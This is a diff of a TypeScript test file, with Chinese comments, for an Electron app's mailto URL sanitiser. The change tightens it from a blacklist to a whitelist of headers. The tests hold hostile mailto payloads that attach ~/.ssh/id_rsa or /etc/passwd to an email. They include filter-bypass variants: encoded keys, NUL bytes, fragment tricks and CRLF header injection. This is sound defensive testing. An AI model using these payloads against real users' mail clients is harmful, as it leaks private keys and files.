@@ -87,9 +87,12 @@ describe('topic49 6thS · external URL scheme whitelist', () => {
 
 // 安全 L4:mailto 的 attach / attachment 参数会让部分邮件客户端静默附加本地文件(Evolution CVE-2020-11879、
 // KMail CVE-2020-11880)。不受信 markdown / 终端输出链接 `mailto:x@evil?attach=~/.ssh/id_rsa` 经 xdg-open 交出
-// → 私钥随邮件外发。主进程 openExternal 统一出口删掉这些参数再打开(各平台)。
-describe('安全 L4 · mailto 去 attach 参数', () => {
-  it('删除 attach / attachment(大小写不敏感),保留其它参数', () => {
+// → 私钥随邮件外发。主进程 openExternal 统一出口净化后再打开(各平台)。
+// 净化是**白名单**:只保留 to / cc / bcc / subject / body / in-reply-to(RFC 6068 常用头),其余参数一律丢弃,
+// 且不保留 fragment —— 黑名单曾被 `#&attach=`(不识别 fragment 的客户端当参数)与 `attach%00=`(键解码后
+// 带 NUL,不等于 attach)绕过。
+describe('安全 L4 · mailto 参数白名单', () => {
+  it('删除 attach / attachment(大小写不敏感),保留白名单参数', () => {
     expect(sanitizeExternalUrl('mailto:x@evil?attach=~/.ssh/id_rsa')).toBe('mailto:x@evil');
     expect(sanitizeExternalUrl('mailto:x@evil?subject=hi&ATTACH=/etc/passwd&body=b')).toBe(
       'mailto:x@evil?subject=hi&body=b',
@@ -97,33 +100,74 @@ describe('安全 L4 · mailto 去 attach 参数', () => {
     expect(sanitizeExternalUrl('MAILTO:x@evil?Attachment=/a&attachment=/b')).toBe('MAILTO:x@evil');
   });
 
-  it('编码变体:键名百分号编码 / 双重编码 / 首尾空白 / ; 分隔', () => {
+  it('编码变体:键名百分号编码 / 双重编码 / ; 分隔 / 解码失败', () => {
     expect(sanitizeExternalUrl('mailto:x@evil?%61ttach=/etc/passwd')).toBe('mailto:x@evil');
     expect(sanitizeExternalUrl('mailto:x@evil?%2561ttach=/etc/passwd')).toBe('mailto:x@evil');
     expect(sanitizeExternalUrl('mailto:x@evil?%20attach%20=/etc/passwd')).toBe('mailto:x@evil');
     expect(sanitizeExternalUrl('mailto:x@evil?subject=a;attach=/etc/passwd')).toBe('mailto:x@evil?subject=a');
     expect(sanitizeExternalUrl('mailto:x@evil?attach%3D/etc/passwd&subject=s')).toBe('mailto:x@evil?subject=s');
-    // 保留未删参数的原分隔符(body 里的 ; 不被改写)
-    expect(sanitizeExternalUrl('mailto:x@evil?body=a;b&attach=/x#f')).toBe('mailto:x@evil?body=a;b#f');
-    // 无法解码的键名 → fail-closed 删除
+    // 无法解码的键名 / 值 → fail-closed 删除
     expect(sanitizeExternalUrl('mailto:x@evil?%E0%A4%A=1&subject=s')).toBe('mailto:x@evil?subject=s');
+    expect(sanitizeExternalUrl('mailto:x@evil?subject=%E0%A4%A&body=b')).toBe('mailto:x@evil?body=b');
   });
 
-  it('不含 attach 的 mailto 与 http(s) 原样返回', () => {
-    expect(sanitizeExternalUrl('mailto:a@b.com?subject=see%20attachment&body=x')).toBe(
+  it('`#` 之后一律丢弃:不识别 fragment 的客户端会把 `#&attach=` 当参数', () => {
+    expect(sanitizeExternalUrl('mailto:a@b?subject=x#&attach=/home/u/.ssh/id_rsa')).toBe('mailto:a@b?subject=x');
+    expect(sanitizeExternalUrl('mailto:a@b#?attach=/home/u/.ssh/id_rsa')).toBe('mailto:a@b');
+    expect(sanitizeExternalUrl('mailto:a@b?#attach=/x')).toBe('mailto:a@b?');
+    expect(sanitizeExternalUrl('mailto:a@b?attach=/x#f')).toBe('mailto:a@b');
+    expect(sanitizeExternalUrl('mailto:a@b#frag')).toBe('mailto:a@b');
+  });
+
+  it('键解码后带控制字符(attach%00)不再漏过;未知头一律丢弃', () => {
+    expect(sanitizeExternalUrl('mailto:a@b?attach%00=/home/u/.ssh/id_rsa')).toBe('mailto:a@b');
+    expect(sanitizeExternalUrl('mailto:a@b?attach%09=/x&attach%7F=/y&%00attach=/z')).toBe('mailto:a@b');
+    expect(sanitizeExternalUrl('mailto:a@b?x-foo=1&subject=s&from=evil@x&X-Mailer=y')).toBe('mailto:a@b?subject=s');
+    // 白名单键本身前后带编码控制字符也丢弃(不靠 trim 把它洗成合法键)
+    expect(sanitizeExternalUrl('mailto:a@b?%0Asubject=s&%00body=b&cc=c@d')).toBe('mailto:a@b?cc=c@d');
+  });
+
+  it('值解码后含控制字符的参数丢弃;body 里的换行 / Tab(%0D %0A %09)是合法正文,保留', () => {
+    expect(sanitizeExternalUrl('mailto:a@b?subject=s%00x&body=b')).toBe('mailto:a@b?body=b');
+    expect(sanitizeExternalUrl('mailto:a@b?subject=s%0D%0ABcc:evil@x&body=b')).toBe('mailto:a@b?body=b');
+    expect(sanitizeExternalUrl('mailto:a@b?body=b%00&cc=c@d%7F&bcc=e@f')).toBe('mailto:a@b?bcc=e@f');
+    const multiline = 'mailto:a@b?subject=s&body=line1%0Aline2%0D%0Aline3%09tab';
+    expect(sanitizeExternalUrl(multiline)).toBe(multiline);
+  });
+
+  it('没有被丢弃内容的 mailto 逐字节不变:白名单全集 / 大小写 / to 重复 / 空 query / 空段', () => {
+    for (const url of [
+      'mailto:a@b.com',
+      'mailto:a@b.com?',
       'mailto:a@b.com?subject=see%20attachment&body=x',
-    );
-    expect(sanitizeExternalUrl('mailto:a@b.com')).toBe('mailto:a@b.com');
-    expect(sanitizeExternalUrl('https://x.test/?attach=1')).toBe('https://x.test/?attach=1');
+      'mailto:?to=a@b&to=c@d&TO=e@f',
+      'mailto:a@b?cc=c@d&bcc=e@f&Subject=S&BODY=b&In-Reply-To=%3Cid@x%3E&%73ubject=t',
+      'mailto:a@b?subject=a&&body=b&',
+      'mailto:a@b?subject', // 无 = 的白名单键
+      'mailto:a@b?%20subject%20=s', // 首尾空白归一后仍是 subject
+    ]) {
+      expect(sanitizeExternalUrl(url)).toBe(url);
+    }
   });
 
-  it('openExternalUrl(IPC 出口)交给系统的是去掉 attach 的 URL', async () => {
+  it('; 也当分隔符:其后的段按同一白名单过滤(body 里未编码的 ; 之后若不是白名单键则被截掉)', () => {
+    expect(sanitizeExternalUrl('mailto:x@evil?body=a;b&attach=/x')).toBe('mailto:x@evil?body=a');
+    expect(sanitizeExternalUrl('mailto:x@evil?subject=a;body=b')).toBe('mailto:x@evil?subject=a;body=b');
+    expect(sanitizeExternalUrl('mailto:x@evil?body=a%3Bb')).toBe('mailto:x@evil?body=a%3Bb');
+  });
+
+  it('非 mailto URL 原样返回(含 # 与 attach)', () => {
+    expect(sanitizeExternalUrl('https://x.test/?attach=1#&attach=2')).toBe('https://x.test/?attach=1#&attach=2');
+    expect(sanitizeExternalUrl('http://x.test/#f')).toBe('http://x.test/#f');
+  });
+
+  it('openExternalUrl(IPC 出口)交给系统的是净化后的 URL', async () => {
     vi.resetModules();
     const openExternal = vi.fn(async () => undefined);
     vi.doMock('electron', () => ({ shell: { openExternal } }));
     try {
       const mod = await import('../../../electron/main/services/shell.service');
-      await mod.openExternalUrl({ url: 'mailto:x@evil?attach=~/.ssh/id_rsa&subject=s' });
+      await mod.openExternalUrl({ url: 'mailto:x@evil?attach%00=~/.ssh/id_rsa&subject=s#&attach=/x' });
       expect(openExternal).toHaveBeenCalledWith('mailto:x@evil?subject=s');
     } finally {
       vi.doUnmock('electron');
